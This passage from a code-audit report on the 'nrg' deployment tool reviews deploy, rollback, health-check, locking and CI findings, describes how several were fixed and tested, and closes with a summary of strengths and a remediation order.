<env_path>`) fails loudly if `env_path` doesn't exist at all — so a *fresh*
write failure (nothing ever there) surfaces immediately, not silently.
The real risk is a **stale** file: `docker_run`'s `env_path` is
`/tmp/.nrg-env-<name>`, and `accessory_run` (`deploy.rhai`) calls `docker_run`
with a fixed, non-unique accessory name (e.g. `"redis"`), so re-running it
reuses the SAME path every time. If a re-run's `write_remote` fails
(permissions changed, disk full, `/tmp` on a `noexec`/`nosuid` mount, etc.)
but a file from a **previous, successful** run already sits at that path,
`docker run --env-file` happily reads the OLD env vars instead — the
container starts, looks healthy, and silently runs with stale
secrets/config, with no error anywhere. `docker_run_once`'s path
(`/tmp/.nrg-release-env-<tag>`) has the same shape for repeated releases of
the same image tag.
**Fix:** check the `write_remote` result in both functions and throw on
failure, identical to the R3b fix; consider also making the temp path
per-invocation-unique (e.g. include a timestamp or PID) so a failed write can
never silently fall back to a stale file regardless.

**Resolved (2026-07-10).** Took the first option: both `docker_run` and
`docker_run_once` now check `write_remote`'s result and throw (naming the
host, path, and `stderr`) before ever issuing the `docker run` command,
matching R3b's fix exactly. Left the temp paths as-is (not made
per-invocation-unique) — the throw-on-failure already removes the silent
stale-reuse risk entirely; a unique-path change would be a separate,
independent hardening step with its own tradeoffs (e.g. accumulating
unused env-files under `/tmp` across restarts) and isn't needed to close
this finding. Covered by two in-crate Rust unit tests
(`src/engine/eval.rs::docker_run_throws_when_the_env_file_write_fails` and
`::docker_run_once_throws_when_the_env_file_write_fails`) that load the REAL
`lib/docker.rhai` via a `FakeRunner` configured to fail the env-file write
specifically, each asserting both the thrown message and that the
container/release-task command is never actually issued — both confirmed to
fail (proceeding to run the container anyway) against the original unchecked
code before the fix.

### R6b — Medium — post-commit cleanup failures silently swallowed — ✅ resolved
`deploy.rhai:209`. Rename/stop/remove after commit use `|| true` and unchecked
results, then state is persisted as if cleanup succeeded. If a host drops SSH between
commit and cleanup, the **old** container keeps running under
`--restart unless-stopped` (double capacity, stale code), the new container keeps its
unique name, and the next deploy's rename dance drifts further — with no error ever
surfaced.

**Resolved (2026-07-10).** The `|| true` baked into each remote shell command is
by design — it makes a retry of an already-completed step idempotent (e.g.
renaming a container that's already been renamed away must not fail) — and
that's exactly why it can't be relied on to signal success: it also swallows a
genuine docker-level failure. What it CANNOT mask is an SSH-level failure: if
the command never reaches the host at all (dropped connection, auth failure),
the remote shell — and its `|| true` — never runs, and the returned
`ExecResult`'s `ok` is correctly `false`. The post-commit loop
(`lib/deploy.rhai`) now captures each of the 5 per-host cleanup calls'
results (`docker_rename` ×2, `docker_stop`, `docker_remove`, `docker_cleanup`)
and, if any reports `!ok`, prints a loud `[warn]` naming the host and the risk
(old and new containers may both still be running under their pre-swap names)
and **skips persisting** `<service>.port.<host>`/`.target.<host>` for that
host — leaving whatever was recorded there before untouched, rather than
claiming a swap that may not have happened. The loop still continues to the
next host, and the fleet-wide service-level state (`.version`, `.image`,
`.config`, `.deployed_at`) still persists afterward regardless — the
transaction already committed a genuinely successful traffic switch across
the whole fleet; only this one host's post-commit tidying is in question.

Covered by two new in-crate Rust unit tests in `src/engine/eval.rs`
(`post_commit_cleanup_failure_skips_persisting_that_hosts_port_and_target`
and `post_commit_cleanup_success_persists_port_and_target_normally`) that load
the REAL `lib/deploy.rhai` via a `FakeRunner`, run in LIVE mode all the way
through a full successful fleet-atomic roll. Reaching post-commit needs the
health check to pass, and `sim_http_healthy` does a REAL HTTP GET even in live
mode (a `FakeRunner` only intercepts ssh/local exec) — so the tests spin up a
genuine local HTTP server and force `sim_pick_port`'s `nc -z` probe (via a
targeted `FakeRunner` failure) to hand out exactly that server's port, so the
real health-check request actually reaches it. The failure test then injects
an SSH-level failure on the rename commands specifically and asserts the
per-host state was left unset while the service-level state and the *rest* of
that host's cleanup steps (stop/remove/prune) were still attempted. Both
mutation-verified: reverting to the original unchecked calls makes the
failure test fail (state gets silently persisted despite the injected
failure) while the companion success test still passes; restoring both
tests to green.

An Opus review pass on this fix flagged that `docker_cleanup`
(`lib/docker.rhai`) — one of the 5 calls this fix now checks — had its OWN,
narrower version of the same bug: it ran TWO prunes (container, then image)
but unconditionally returned only the second's `ExecResult`, discarding the
first's entirely. So a caller checking `.ok` couldn't tell an SSH-level
failure during the FIRST prune from a clean run, as long as the second prune
still happened to succeed — a strictly smaller window than the finding's main
scenario (a fully dropped connection fails both prunes identically, which
`docker_cleanup`'s old code still caught via the second call), but a real gap
nonetheless. Fixed in the same slice: `docker_cleanup` now returns whichever
prune failed (preferring the container-prune's result if IT failed, since
that runs first), or the image-prune's result otherwise. Covered by a new
unit test, `docker_cleanup_reports_failure_when_container_prune_fails_even_if_image_prune_succeeds`
(`src/engine/eval.rs`), confirmed to fail against the pre-fix code. A Fable
review pass also improved the warning message itself: it now names exactly
which step(s) failed (rename/stop/remove/cleanup) with each one's `stderr`,
instead of a single generic line — faster manual triage when this fires.

**Still open:** this fix stops the WRONG thing from happening (state
silently claiming a swap that didn't complete) but doesn't reduce the
NEW container to zero waste once cleanup fails: it keeps its unique
versioned name (`<service>-web-<version>-<port>`) rather than the
canonical one, so if the operator doesn't act on the warning and a LATER
deploy succeeds normally, that later deploy's own post-commit loop only
ever touches `canonical` and its OWN new unique name — the orphaned
container from the failed cleanup is never referenced again by anything
`nrg` does automatically, and leaks capacity until someone finds and
removes it by hand. Recovery is entirely dependent on the operator
heeding the `[warn]` line. There's no automatic retry or escalation after
N consecutive failures — every deploy attempt re-warns independently,
which is an intentional, minimal scope (matching R5's precedent of
deferring a larger, separate mechanism) rather than an oversight, but
worth stating plainly rather than leaving implicit.

### R29 — High — nesting `deploy()` inside a user transaction can resurrect post-committed compensations into a blackhole
`lib/deploy.rhai:214-239` (original, pre-fix line numbers; the guard added
below shifted these down by ~18 lines) with `src/engine/transaction.rs:42-51`.
**Verified** (found by an adversarial red-team pass during R6's review,
reproduced against the real engine with a throwaway script — not yet fixed).

`transaction`/`on_rollback` are ordinary global builtins, so nothing stops a
script from wrapping `deploy()` (or several `deploy()` calls, e.g. for a
multi-service atomic release) in its OWN outer `transaction()`. Per the
documented nesting semantics (`docs/safety.md`, "Nesting"), a **nested**
transaction's compensations are deliberately NOT dropped on success — they
stay on the shared stack so an *enclosing* transaction's later failure can
still unwind them. `deploy()`'s own fleet transaction becomes exactly such a
nested transaction when called this way.

The bug: `deploy()`'s POST-COMMIT phase (renaming the canonical container,
stopping and **removing** the old one, persisting the new port) runs
immediately after its transaction returns `Ok`, treating that `Ok` as
final. When nested, it isn't: the per-host `on_rollback` closures (rm-new /
restore-proxy, including R6's guard flags) registered during that "committed"
transaction are still live. If something ELSE later throws in the *outer*
transaction's body (an unrelated failure — e.g. a second service's deploy
failing in the same multi-service release), the unwind resurrects those
stale closures. The restore-proxy compensation repoints the proxy at
`old_target` — whose container POST-COMMIT already stopped and removed. The
result is the exact blackhole class R6 was written to close, via a different
mechanism (stale-compensation resurrection instead of compensation-failure
continuation). This is a PRE-EXISTING issue, not introduced or worsened by
the R6 fix — the same resurrection would have hit the OLD, unguarded rm-new
compensation identically before R6, with an identical outcome.
**Fix:** either have `deploy()` refuse to run when already inside an active
transaction (assert nesting depth is 0), or fold the post-commit phase INTO
the transaction (register its own compensations / don't treat inner commit
as final), or have post-commit explicitly drop ("cancel") the per-host
compensations it just made moot once it has safely completed their intent.

**Resolved (2026-07-10).** Took the first option: nesting `deploy()` inside a
user transaction isn't a documented or exemplified usage pattern anywhere in
this codebase (checked `docs/*.md` and `lib/examples/`), so refusing it
outright is the safest fix — it removes the hazard entirely rather than
attempting to make post-commit safe under an interaction the rest of the
codebase never anticipated. A new `in_transaction()` builtin
(`src/engine/transaction.rs`, checks the existing nesting-`depth` counter —
already tracked identically in both dry-run and live mode, so this reports
correctly in both) lets `deploy()` (`lib/deploy.rhai`) check, as its very
first statement — before any build/push/pull work — whether it's already
running inside an active transaction, and throw a clear, actionable error
naming R29 if so.

`rollback()` calls `deploy()` internally, so it inherits the same protection
— but an Opus review pass caught that inheriting isn't quite enough:
`rollback()` persists `<service>.prev = <the current image>` as a real side
effect *before* calling `deploy()`, so a nested `rollback()` relying only on
`deploy()`'s check would still have advanced `.prev` to the current image by
the time the throw happened — leaving a caller who read the error and
retried `rollback()` at the top level rolling back to the wrong image.
`rollback()` now carries the identical `in_transaction()` check as its own
first statement too, before that state write. The same review pass also
noted `deploy_one_host` (the per-host worker, called only from inside
`deploy()`'s own transaction) wasn't marked `private fn` and was technically
reachable as `deploy::deploy_one_host(...)`, bypassing the guard — though it
does no post-commit "treat the commit as final" work itself, so this was
informational rather than a real reopening of R29; it's now `private fn`
anyway, for defense-in-depth and consistency with its sibling helpers.

Covered by a Rust-level unit test asserting `in_transaction()` correctly
tracks nesting depth through a transaction and a nested transaction
(`src/engine/transaction.rs::in_transaction_reflects_nesting_depth`), plus
three integration tests (`tests/deploy_behaviors.rs`): one confirming
`deploy()` throws the expected error when nested inside a `transaction()`
(verified to fail without the guard); one confirming a normal, non-nested
`deploy()` call is unaffected by the new check; and one confirming `rollback()`
refuses when nested WITHOUT first mutating `<service>.prev` (a real,
persisted state assertion against `state.json` from a live run — verified to
fail if `rollback()`'s own check is removed, falling through to `deploy()`'s
later check after the state write already happened).

### R13 — Medium — Caddy `PATCH || POST` conflates 404 with any failure
`lib/caddy.rhai:144`. A transient admin-API 400/timeout on `PATCH` triggers the
`POST` branch, which **appends** a duplicate `@id` route at the end of the array
(first match wins → traffic keeps hitting the stale upstream while the tool reports
success). Two domain-less services both become catch-all routes and one swallows the
other. Distinguish 404 from other errors; use PUT-at-id semantics.

### R15 — Medium — no concurrency guard across a deploy
`deploy.rhai` + `sim.rs:246`. Port pick is scan-then-use TOCTOU; the canonical
rename dance and the `.target.<host>` state have no per-service lock. Two
simultaneous deploys of the same service can pick the same "free" port (late bind
failure unwinds a healthy fleet) or interleave renames so `svc-web` / `svc-web-old`
point at the wrong generation and corrupt the next deploy's `old_target`. The
project-level flock serializes *within one control machine* but not across two
operators/CI runners.

### R21 — Low — empty `hosts` array "succeeds" and rewrites rollback state
`deploy.rhai` (~145). An empty host group: `hosts[0]` panics if `pre_deploy` is set;
otherwise the deploy touches no host but still persists new `.version`/`.image`/`.prev`.
State then claims v42 is live and the rollback chain is repointed. Validate `hosts`
is non-empty.

### R10b — Medium — accessories: no readiness check, existing container blocks re-run
`deploy.rhai:463` (`accessory_run`). No `rm -f` before `docker run --name`, so a
stopped-but-present accessory makes every future deploy fail with "name already in
use"; conversely a `run -d` that starts then immediately crashes counts as success
and the app deploys against a dead DB.

### R20 / R25 / R22 / R23 / R26 — Low
- Discarded `post_deploy_cmd` results — a hook that fails on 2/5 hosts reports full
  success (`deploy.rhai:228`).
- Unchecked proxy-image `pull` results (`proxy.rhai:42`, `caddy.rhai:51`).
- `cfg.keep_images` is documented but unused — cleanup only prunes dangling images,
  so tagged old images accumulate until the disk fills (`docker.rhai:256`).
- `recipe.rhai` accesses required keys (`service`, `image_repo`, `web_hosts`,
  registry creds, `db_host`) without existence checks → opaque property errors
  mid-flow; `cfg.network` isn't forwarded to accessories, so the app can't resolve
  the DB on a custom network.
- `attempts <= 0` in `wait_healthy` reads `.status` off an empty map → a
  "property not found" error masks the real health-check failure (`healthcheck.rhai:35`).

---

## 6. Health checks (`lib/healthcheck.rhai`)

### R11 — Medium — double retry loops multiply the timeout by up to 30×
`healthcheck.rhai:64` and `93` wrap `cfg.attempts` retries **around**
`sim_wait_port` / `sim_container_healthy`, which already loop `30 × 2 s`
internally (`sim.rs:345`). So `#{attempts: 5, interval: 1}` — which an operator
reads as a ~5 s bound — actually blocks up to `5 × 60 s = 5 min`, holding the fleet
transaction open the whole time (defaults ≈ 30 min).

### R12 — Medium — single 200 counts as healthy; global 30 s per-request timeout
`healthcheck.rhai:29`. One HTTP 200 passes the gate — no consecutive-success window
— so an app that answers `/up` once during boot then OOMs gets traffic switched to
it (and the Caddy path has no switch-time health gate of its own, unlike
kamal-proxy, so users get 502s). Separately, `http_get`'s timeout is a fixed global
30 s (`http.rs:9`) unrelated to `interval`, so a hanging endpoint makes 30 attempts
take ~16 min.

### R7-health — Medium — health URL assumes the SSH host is an HTTP-reachable name
`deploy.rhai:369` + `healthcheck.rhai`. The probe is an HTTP GET from the **control
machine** to `http://<ssh-host-string>:<ephemeral-port><path>`. With the documented
`web_hosts: ["deploy@web1"]`, the URL becomes `http://deploy@web1:13001/up`
(userinfo in the URL, alias not DNS-resolvable), and on hosts firewalled to 80/443
the ephemeral port is unreachable from the control machine — so a perfectly healthy
container fails health-wait and unwinds the fleet. Health checks should run
**on the host** (over SSH against localhost), not from the control machine.

---

## 7. State, locking, crash safety (`src/engine/state.rs`, `src/cli/exec.rs`)

The state layer is the most robust part of the codebase (atomic fsync'd writes,
unique temp files, corrupt-state fail-loud, future-version refusal, reload-before-write
merge, `0600`). Residual gaps:

### R7 — High — no signal handling; Ctrl-C runs no compensations
`src/main.rs` (absent). There is no SIGINT/SIGTERM handler anywhere. Ctrl-C on a
hanging deploy kills the process mid-transaction: **zero** `on_rollback`
compensations run, the flock is released only by process death, and any state
flushed mid-fleet stays as-is. The operator is left with traffic switched on some
hosts, orphaned `app-web-<ver>` containers, and no automatic unwind. The
transaction docs don't list this as a limit.
**Fix:** install a handler that triggers the compensation unwind (or at minimum
records pending compensations to disk so a follow-up run can complete them), and
document the interrupted-run recovery path.

**Resolved (2026-07-10).** `nrg` now installs a SIGINT/SIGTERM handler once per
`nrg exec`/`nrg run` invocation (`src/engine/interrupt.rs`) that flips a
shared flag, polled by the engine's `on_progress` hook between every
script-level operation (`src/engine/mod.rs`). A set flag ends the running
script with a normal `Err` (`ErrorTerminated`) — the same path a `throw`
takes — so an enclosing `transaction()`'s existing unwind runs every
registered compensation, and the state lock releases via its normal `Drop`,
not because the OS killed the process. The flag is consumed via an atomic
`swap` (not `load`) so the compensations that run during the unwind aren't
themselves immediately re-terminated by the same still-set flag — an actual
bug caught by this fix's own test coverage during development (a naive
`load`-based check silently turned every rollback into a no-op). Documented
in full, including the exact scope, in `docs/safety.md`'s "Ctrl-C
(SIGINT/SIGTERM) triggers the same unwind" section: `on_progress` fires
*between* operations, not *during* one blocking native call, so a
health-check retry loop (bounded `sleep()` per iteration) responds within
about a second, but a single long- or forever-blocking
`ssh_exec`/`local_exec`/`http_get` call can't be preempted mid-flight —
that's the still-open, separate command-timeout gap below. A **second**
signal (which would otherwise be silently swallowed while stuck in exactly
that kind of un-preemptible blocking call, since installing a handler
replaces the default terminate-immediately behavior) exits the process
immediately via `signal_hook::flag::register_conditional_shutdown` — a
force-quit escape hatch, so an operator is never left with no way to kill a
stuck `nrg` short of `SIGKILL`. Covered by a real end-to-end test that sends
an actual SIGINT to a spawned `nrg exec` child process
(`tests/interrupt.rs`) plus a fast unit test simulating the interrupt
without a real signal (`src/engine/mod.rs`).

### Blocking lock wait has no timeout — Medium
`wire_run` calls `lock.write()` which blocks indefinitely. There is no
`--lock-timeout`. Worse, if `root.canonicalize()` in `lock_key` fails, the
re-entrancy key won't match `NRG_STATE_LOCK` and a nested `nrg` self-deadlocks
forever. Add a timeout and fall back gracefully on canonicalize failure.

### Stale `NRG_STATE_LOCK` defeats serialization — Medium
`lock_is_reentrant` trusts the env var. A CI runner that leaks `NRG_STATE_LOCK`
across jobs (same root path) makes a second, genuinely-concurrent deploy skip the
lock and mutate `state.json` concurrently — losing history despite the "serialized"
guarantee. Consider validating the lock is actually held by an ancestor (PID
check), not just that the env var matches.

### `.bak` recovery path is untested — Medium
The `state.json.bak` write is best-effort (`let _ = fs::copy`) and the documented
"restore from backup" recovery has **no test** proving it works. A JSON file that
parses but has the wrong shape (`data` not a map) is also untested.

---

## 8. Tests & CI

### R8 — High — the live deploy path is never executed
`tests/deploy_dryrun.rs`, `deploy_behaviors.rs`, `caddy_proxy.rs`. Every integration
test of the ~1,500-line deploy stdlib runs through `--dry-run` and asserts on plan
**strings**. `FakeRunner` is `#[cfg(test)]`-only and can't be injected into the
spawned `nrg` binary, so the live branches (real `r.ok` handling, `wait_healthy`
loops, post-commit cleanup ordering, the whole rollback unwind) are **never run by
any test**. Combined with the plan-string coupling (tests break on benign wording
changes but prove nothing about live behavior), the stdlib's real risk is untested.
**Fix:** add an `NRG_RUNNER=fake` (or a script-injection) seam so integration tests
can drive live-mode branches against a scripted runner; add a local-sshd or
container-based smoke test for at least one real deploy + rollback.

### R8b — High — `rollback()` has zero tests
`lib/deploy.rhai:407`. The user-facing disaster-recovery entrypoint is exercised by
**no** test — not even a dry-run plan assertion. Only the compensation *registration*
wiring is checked. During an incident is the worst time to discover it errors.

### Real `ssh` / `docker` never exercised — High/Medium
No test spawns a real `ssh` (no sshd fixture) or `docker`. `RealRunner`'s argv
construction, exit-code mapping, and stdin piping against a live sshd are
unverified; an ssh-invocation regression breaks every remote command while the suite
stays green. Only `nrg doctor` checks toolchain presence — and `doctor` itself is
untested (below).

### CLI commands `doctor` / `init` / `tasks` / `ssh` — Medium
Zero tests. `doctor`'s `all_ok` group logic could invert and ship unnoticed; `init`'s
refuse-to-overwrite branch and `nrg ssh`'s option-injection guard are unverified.

### HTTP builtins — Medium
No test ever performs a **successful** HTTP request (no local test server) — only
unreachable-URL failures and dry-run short-circuits. The `http_status_as_error(false)`
behavior the health-check logic depends on, body extraction on 2xx/5xx, and the 30 s
timeout are untested. A `ureq` upgrade that changes any of these would silently break
health checks.

### Secrets error paths & `ENC[...]` runtime resolution — Medium
Only happy-path round-trips are tested. Wrong-key decrypt, malformed armor,
missing/unreadable pubkey, `unseal` overwrite of an existing `.env`, and the
`.gitignore` warning logic are untested. Nothing pins what `secret()` does with a
sealed value in `.env` (see R3).

### Age tests report pass when age is absent — Medium
`tests/secrets_age.rs` returns early (reporting **pass**, not skip) when
`age`/`age-keygen` are missing. If the CI `apt-get install age` step were removed,
the credential pipeline would go untested with a green build. Use a real skip
mechanism, or assert the tests actually ran.

### Flaky patterns — Medium
- `tests/lock_contention.rs` `concurrent_runs_serialize_on_the_state_lock` depends
  on wall-clock timing (spawn A, sleep 400 ms assuming A holds the lock, assert B
  waited ≥ 800 ms). On a loaded CI runner where A takes > 400 ms to reach the lock,
  B wins and the assertion fails. It also has no timeout on `a.wait()` — a lock
  regression hangs CI for hours instead of failing.
- Many unit tests `set_var`/`remove_var` process-global env while cargo runs test
  threads in parallel (`runner.rs` host-key test, `secret.rs`, `exec.rs`
  `NRG_SECRET_LEAK`). This races, and `set_var` concurrent with `getenv` is
  UB-adjacent on glibc. Serialize env-mutating tests or use per-process isolation.

### CI robustness — Medium/Low
- No `cargo fmt --check`.
- No `cargo audit` / `cargo deny` — a secrets-handling deploy tool has no alert for a
  known-vulnerable `ureq`/`rhai`/`fd-lock`.
- Single-OS matrix (`ubuntu-latest`) though errors recommend `brew install age`;
  macOS is never built. `src/cli/ssh.rs` unconditionally imports
  `std::os::unix::process::CommandExt`, so the crate cannot compile on Windows
  despite scattered `#[cfg(not(unix))]` fallbacks.
- No MSRV (`rust-version`) or toolchain pin; with `clippy -D warnings`, any new
  stable can break CI on unrelated PRs.
- No release/tag workflow or published binary — operators build ad-hoc from
  arbitrary commits with no reproducible artifact to roll back to.
- No per-test timeout (no `nextest`) despite blocking/spawning tests.

---

## What is already solid

Worth stating plainly, so the findings above are read in proportion:

- **Command-injection surface at the Rust boundary** is well-defended:
  option-injection rejection (`--` end-of-options + refusing `-`-prefixed hosts),
  the `Secret` type with a non-shell sentinel + `assert_no_secret_leak` at every
  effect boundary, and POSIX single-quoting via `sh_quote`.
- **Secrets don't leak through the Rust layer:** hand-written `Debug`, `to_string`
  yielding a detectable sentinel, a `+` ban, and redaction at every output sink
  (`on_print`, thrown errors, the plan log, traces).
- **State integrity:** atomic fsync'd writes with unique temp files, directory
  fsync, corrupt-state fail-loud (no silent reset), future-version refusal,
  reload-before-write merge for nested runs, and `0600` on state/key/backup.
- **Dry-run is structurally safe:** no lock, no writes (overlay store), per-builtin
  effect classification, and a sim that keeps reads consistent with stubbed writes,
  seeded from one real probe.
- **Transactions** implement correct LIFO, error-isolated, reentrancy-safe,
  deadlock-free unwind semantics (well unit-tested).
- **Strong unit coverage** of exactly these Rust-core invariants; the full suite
  passes with `--locked` and clippy-as-errors.

The gap is concentrated where the real orchestration lives — the Rhai stdlib and its
live execution path — and in operational hardening (timeouts, signals, decryption
wiring) rather than in the core safety primitives.

---

## Suggested remediation order

1. **R3** (ENC decryption wiring or loud doc) and **R1/R2** (injection) — correctness
   and security, small diffs.
2. **R4** (probe classifier) and **R5** (SSH timeouts/keep-alive) — one-line-ish fixes
   that prevent wedged deploys.
3. **R6 + R7** (rollback blackhole guard + signal handling) — the "makes an incident
   worse" class.
4. **R8** (a live-mode test seam) — unblocks testing everything else.
5. The remaining Medium stdlib items (health-check URL/timeout, concurrency).
6. CI hardening (fmt, audit, MSRV, macOS) and flaky-test cleanup.
